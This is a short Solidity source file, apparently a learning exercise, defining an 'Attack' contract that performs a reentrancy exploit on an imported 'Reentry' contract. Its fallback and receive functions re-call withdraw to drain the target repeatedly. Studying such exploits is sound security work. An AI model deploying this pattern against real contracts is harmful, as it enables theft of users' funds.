// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "entrancy.sol";

contract Attack {

    Reentry public reentry;

    event Log(address indexed sender, string message);

    constructor(address payable _reentryAddress) {

        reentry = Reentry(_reentryAddress);
    }

    function attackReentry() public payable {

        // require(msg.value >= 1 ether);
        reentry.deposit(100 wei);
        reentry.withdraw(33 wei);
    }

    function deposit100Wei() public payable {

        reentry.deposit(100 wei);
    }

    // function collectEther() public payable {

    //     msg.sender.transfer(100 wei);
    // }

    // fallback() external payable {
    fallback() external payable {

        reentry.withdraw(12 wei);
        emit Log(msg.sender, "Fallback is called!");
    }

    receive() external payable {

        reentry.withdraw(12 wei);
        emit Log(msg.sender, "Receive is called!");
    }

}